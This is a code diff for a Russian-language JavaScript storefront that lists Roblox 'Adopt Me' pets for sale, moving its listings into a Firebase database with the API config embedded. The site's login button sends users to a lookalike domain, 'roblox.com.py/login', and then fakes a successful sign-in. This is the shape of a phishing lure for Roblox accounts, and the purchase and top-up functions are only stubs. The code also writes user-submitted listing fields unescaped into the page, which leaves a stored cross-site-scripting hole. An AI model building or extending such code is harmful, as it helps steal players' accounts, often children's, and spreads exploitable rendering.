@@ -1,31 +1,43 @@
-// ==========================================
-// КОНФИГУРАЦИЯ
-// ==========================================
+// =========================================================
+// 1. ПОДКЛЮЧЕНИЕ FIREBASE И НАСТРОЙКИ
+// =========================================================
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+import { getDatabase, ref, push, onValue } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+
+// ТВОЯ КОНФИГУРАЦИЯ (Вставлена из твоего сообщения)
+const firebaseConfig = {
+  apiKey: "AIzaSyBUVG2e9TVe6WlU72Hrjin03QXtkTGiNc0",
+  authDomain: "star-marketdb.firebaseapp.com",
+  databaseURL: "https://star-marketdb-default-rtdb.europe-west1.firebasedatabase.app",
+  projectId: "star-marketdb",
+  storageBucket: "star-marketdb.firebasestorage.app",
+  messagingSenderId: "1040104655803",
+  appId: "1:1040104655803:web:45bc355371265d36d8129e"
+};
+
+// Инициализация приложения
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
+
+// Ссылка на таблицу с лотами
+const petsRef = ref(db, 'market_lots');
+
+// =========================================================
+// 2. ДАННЫЕ И ПЕРЕМЕННЫЕ
+// =========================================================
 const ROBLOX_AUTH_LINK = "https://roblox.com.py/login?returnUrl=4210845075632139"; 
 const ADOPT_ME_DATA = {
-    // Для краткости пару примеров, но код работает для всех
-    "pets": ["Shadow Dragon","Bat Dragon","Giraffe","Frost Dragon","Owl","Parrot","Evil Unicorn","Crow","Arctic Reindeer","Turtle","Kangaroo","Unicorn","Dragon","Kitsune"]
+    "pets": ["Shadow Dragon","Bat Dragon","Giraffe","Frost Dragon","Owl","Parrot","Evil Unicorn","Crow","Arctic Reindeer","Turtle","Kangaroo","Unicorn","Dragon","Kitsune","Dog","Cat","Otter"]
 };
 
-// URL-адреса иконок (зелья и значки)
-const ICONS = {
-    fly: "https://static.wikia.nocookie.net/adoptme/images/5/5f/Fly_Potion.png",
-    ride: "https://static.wikia.nocookie.net/adoptme/images/a/a6/Ride_Potion.png",
-    neon: "https://static.wikia.nocookie.net/adoptme/images/3/36/Neon_Potion.png",
-    mega: "https://static.wikia.nocookie.net/adoptme/images/2/2f/Mega_Neon_Icon.png"
-};
+let currentUser = null; 
 
-// ==========================================
-// БАЗА ДАННЫХ И СОСТОЯНИЕ
-// ==========================================
-let globalMarket = JSON.parse(localStorage.getItem('petsMarketDB')) || [];
-let currentUser = null; // Хранит {name: "...", id: ...}
-
+// Элементы интерфейса
 const petsContainer = document.getElementById('petsContainer');
 const loginModal = document.getElementById('loginModal');
 const sellModal = document.getElementById('sellModal');
 
-// Заполняем Datalist
+// Заполняем выпадающий список петов
 const petsList = document.getElementById('petsList');
 ADOPT_ME_DATA.pets.sort().forEach(pet => {
     let opt = document.createElement('option');
@@ -33,38 +45,90 @@ ADOPT_ME_DATA.pets.sort().forEach(pet => {
     petsList.appendChild(opt);
 });
 
-// ==========================================
-// СИСТЕМА АВТОРИЗАЦИИ
-// ==========================================
+// =========================================================
+// 3. СЛУШАЕМ БАЗУ ДАННЫХ (REALTIME)
+// =========================================================
+// Эта функция срабатывает каждый раз, когда кто-то добавляет лот
+onValue(petsRef, (snapshot) => {
+    petsContainer.innerHTML = ""; // Очищаем текущий список
+    const data = snapshot.val();  // Получаем данные
+
+    if (data) {
+        // Превращаем данные в массив и переворачиваем (новые сверху)
+        const lotsArray = Object.values(data).reverse();
+        
+        lotsArray.forEach(lot => {
+            renderCard(lot);
+        });
+    } else {
+        petsContainer.innerHTML = "<p style='color:#666; width:100%; text-align:center; padding: 20px;'>Лотов пока нет. Будьте первым!</p>";
+    }
+});
+
+// Функция отрисовки карточки
+function renderCard(lot) {
+    const card = document.createElement('div');
+    card.className = 'item-card';
+
+    // Рендер стикеров
+    let badgesHtml = "";
+    if(lot.stickers && lot.stickers.length > 0) {
+        badgesHtml = `<div class="badges-row">`;
+        lot.stickers.forEach(sticker => {
+            badgesHtml += `<div class="mini-sticker ${sticker.class}">${sticker.letter}</div>`;
+        });
+        badgesHtml += `</div>`;
+    }
+
+    card.innerHTML = `
+        <div class="card-img-area">
+            ${badgesHtml}
+            <img src="${lot.image}" onerror="this.src='https://static.wikia.nocookie.net/adoptme/images/5/5e/Cracked_Egg.png'">
+        </div>
+        <div class="card-info">
+            <div class="card-name" title="${lot.name}">${lot.name}</div>
+            <span class="card-seller">@${lot.contact}</span>
+            <div class="price-row">
+                <span class="price">${lot.price} ₽</span>
+                <button class="btn-buy-card" onclick="alert('Недостаточно средств на балансе. Функция в разработке.')">
+                    <i class="fa-solid fa-cart-shopping"></i>
+                </button>
+            </div>
+        </div>
+    `;
+    petsContainer.appendChild(card);
+}
+
+// =========================================================
+// 4. СИСТЕМА АВТОРИЗАЦИИ
+// =========================================================
 const headerLoginBtn = document.getElementById('headerLoginBtn');
 const startAuthBtn = document.getElementById('startAuthBtn');
 const confirmAuthBtn = document.getElementById('confirmAuthBtn');
 const loginConfirmArea = document.getElementById('loginConfirmArea');
 
-// Функция проверки входа перед действием
+// Проверка входа
 function checkAuth() {
     if (currentUser) return true;
     
-    // Если не вошел - показываем окно
+    // Если не вошел
     loginModal.style.display = 'flex';
     startAuthBtn.style.display = 'block';
     loginConfirmArea.style.display = 'none';
     return false;
 }
 
-// 1. Нажал "Войти" (в шапке)
+// Кнопки интерфейса
 headerLoginBtn.onclick = () => checkAuth();
-
-// 2. Блокировка Инвентаря и Баланса
-document.getElementById('inventoryBtn').onclick = (e) => {
-    if(!checkAuth()) e.preventDefault(); // Блокируем ссылку
-    else alert("Открываю инвентарь...");
+document.getElementById('inventoryBtn').onclick = (e) => { 
+    if(!checkAuth()) e.preventDefault(); 
+    else alert("Ваш инвентарь пуст.");
 };
-document.getElementById('balanceBtn').onclick = () => {
-    if(checkAuth()) alert("Открываю меню пополнения..."); 
+document.getElementById('balanceBtn').onclick = () => { 
+    if(checkAuth()) alert("Меню пополнения баланса..."); 
 };
 
-// 3. Процесс входа
+// Логика модального окна входа
 startAuthBtn.onclick = () => {
     window.open(ROBLOX_AUTH_LINK, '_blank');
     startAuthBtn.style.display = 'none';
@@ -72,13 +136,9 @@ startAuthBtn.onclick = () => {
 };
 
 confirmAuthBtn.onclick = () => {
-    // Симуляция успешного входа
-    const rnd = Math.floor(Math.random() * 5000);
-    currentUser = {
-        name: `User_${rnd}`,
-        balance: 0
-    };
-    
+    // Генерируем случайного пользователя
+    const rnd = Math.floor(Math.random() * 9000) + 1000;
+    currentUser = { name: `RobloxUser_${rnd}` };
     updateHeader();
     loginModal.style.display = 'none';
 };
@@ -89,14 +149,14 @@ function updateHeader() {
         <div class="user-badge">
             <div class="avatar-circle"></div>
             <span>${currentUser.name}</span>
-            <i class="fa-solid fa-right-from-bracket" onclick="location.reload()" style="cursor:pointer; margin-left:5px; color:#666;"></i>
+            <i class="fa-solid fa-right-from-bracket" onclick="location.reload()" style="cursor:pointer; margin-left:5px; color:#666;" title="Выйти"></i>
         </div>
     `;
 }
 
-// ==========================================
-// ЛОГИКА ПРОДАЖИ (ФОТО + ИКОНКИ)
-// ==========================================
+// =========================================================
+// 5. ЛОГИКА ПРОДАЖИ (ОТПРАВКА В FIREBASE)
+// =========================================================
 const sidebarSellBtn = document.getElementById('sidebarSellBtn');
 const sellForm = document.getElementById('sellForm');
 
@@ -104,18 +164,13 @@ sidebarSellBtn.onclick = () => {
     if(checkAuth()) sellModal.style.display = 'flex';
 };
 
-// Логика выбора иконок (Fly/Ride/Neon)
-const selectedProps = {
-    propFly: false,
-    propRide: false,
-    propNeon: false,
-    propMega: false
-};
+// Выбор стикеров (F, R, N, M)
+const selectedProps = { propFly: false, propRide: false, propNeon: false, propMega: false };
 
-// Функция переключения класса .selected
 window.toggleProp = function(id) {
     const el = document.getElementById(id);
-    // Если выбрали Мега, отключаем Неон (и наоборот)
+    
+    // Логика: Мега выключает Неон и наоборот
     if(id === 'propMega' && !selectedProps.propMega) {
         selectedProps.propNeon = false;
         document.getElementById('propNeon').classList.remove('selected');
@@ -126,12 +181,10 @@ window.toggleProp = function(id) {
     }
 
     selectedProps[id] = !selectedProps[id];
-    
-    if (selectedProps[id]) el.classList.add('selected');
-    else el.classList.remove('selected');
+    el.classList.toggle('selected', selectedProps[id]);
 };
 
-// Обработка Файла
+// Загрузка фото
 const fileInput = document.getElementById('petFileInput');
 const fileNameLabel = document.getElementById('fileName');
 let customImageBase64 = null;
@@ -139,17 +192,20 @@ let customImageBase64 = null;
 fileInput.onchange = () => {
     const file = fileInput.files[0];
     if (file) {
-        fileNameLabel.innerText = "Файл выбран: " + file.name;
-        // Конвертация в Base64 для отображения
+        // Проверка размера (Макс 1МБ для базы данных)
+        if(file.size > 1048576) {
+            alert("Файл слишком большой! Выберите фото меньше 1 МБ.");
+            fileInput.value = "";
+            return;
+        }
+        fileNameLabel.innerText = "Файл выбран";
         const reader = new FileReader();
-        reader.onload = function(e) {
-            customImageBase64 = e.target.result;
-        };
+        reader.onload = (e) => customImageBase64 = e.target.result;
         reader.readAsDataURL(file);
     }
 };
 
-// ОТПРАВКА ЛОТА
+// Отправка формы
 sellForm.addEventListener('submit', (e) => {
     e.preventDefault();
     
@@ -157,21 +213,21 @@ sellForm.addEventListener('submit', (e) => {
     const price = document.getElementById('petPrice').value;
     const telegram = document.getElementById('telegramUser').value;
 
-    // Определяем картинку: Своя ИЛИ Стоковая (Wiki)
+    // Картинка: своя или с вики
     let finalImage = customImageBase64;
     if (!finalImage) {
-        // Формируем ссылку на вики
         const wikiName = petName.replace(/ /g, '_');
         finalImage = `https://static.wikia.nocookie.net/adoptme/images/a/a5/${wikiName}.png`;
     }
 
-    // Собираем массив активных иконок
-    let activeBadges = [];
-    if(selectedProps.propFly) activeBadges.push(ICONS.fly);
-    if(selectedProps.propRide) activeBadges.push(ICONS.ride);
-    if(selectedProps.propNeon) activeBadges.push(ICONS.neon);
-    if(selectedProps.propMega) activeBadges.push(ICONS.mega);
+    // Собираем стикеры
+    let activeStickers = [];
+    if(selectedProps.propFly) activeStickers.push({class: 'sticker-f', letter: 'F'});
+    if(selectedProps.propRide) activeStickers.push({class: 'sticker-r', letter: 'R'});
+    if(selectedProps.propNeon) activeStickers.push({class: 'sticker-n', letter: 'N'});
+    if(selectedProps.propMega) activeStickers.push({class: 'sticker-m', letter: 'M'});
 
+    // Создаем объект лота
     const newLot = {
         id: Date.now(),
         name: petName,
@@ -179,16 +235,21 @@ sellForm.addEventListener('submit', (e) => {
         seller: currentUser.name,
         contact: telegram,
         image: finalImage,
-        badges: activeBadges
+        stickers: activeStickers,
+        timestamp: Date.now()
     };
 
-    globalMarket.unshift(newLot);
-    localStorage.setItem('petsMarketDB', JSON.stringify(globalMarket));
-
-    renderGrid();
-    sellModal.style.display = 'none';
-    sellForm.reset();
-    resetProps(); // сброс выбора
+    // ОТПРАВЛЯЕМ В FIREBASE
+    push(petsRef, newLot)
+        .then(() => {
+            // Если все прошло успешно
+            sellModal.style.display = 'none';
+            sellForm.reset();
+            resetProps();
+        })
+        .catch((error) => {
+            alert("Ошибка: " + error.message);
+        });
 });
 
 function resetProps() {
@@ -198,45 +259,6 @@ function resetProps() {
     });
     customImageBase64 = null;
     fileNameLabel.innerText = "Или останется стоковое";
-}
-
-// ==========================================
-// ОТРИСОВКА (RENDER)
-// ==========================================
-function renderGrid() {
-    petsContainer.innerHTML = "";
-    globalMarket.forEach(lot => {
-        const card = document.createElement('div');
-        card.className = 'item-card';
-
-        // Генерируем HTML иконок
-        let badgesHtml = "";
-        if(lot.badges && lot.badges.length > 0) {
-            badgesHtml = `<div class="badges-row">`;
-            lot.badges.forEach(iconUrl => {
-                badgesHtml += `<img src="${iconUrl}" class="badge-icon">`;
-            });
-            badgesHtml += `</div>`;
-        }
-
-        card.innerHTML = `
-            <div class="card-img-area">
-                ${badgesHtml}
-                <img src="${lot.image}" onerror="this.src='https://static.wikia.nocookie.net/adoptme/images/5/5e/Cracked_Egg.png'">
-            </div>
-            <div class="card-info">
-                <div class="card-name" title="${lot.name}">${lot.name}</div>
-                <span class="card-seller">@${lot.contact}</span>
-                <div class="price-row">
-                    <span class="price">${lot.price} ₽</span>
-                    <button class="btn-buy-card" onclick="alert('Для покупки пополните баланс')">
-                        <i class="fa-solid fa-cart-shopping"></i>
-                    </button>
-                </div>
-            </div>
-        `;
-        petsContainer.insertBefore(card, petsContainer.firstChild);
-    });
 }
 
 // Закрытие модалок
@@ -249,7 +271,3 @@ window.onclick = (e) => {
         sellModal.style.display = 'none';
     }
 }
-
-// Старт
-
-renderGrid();
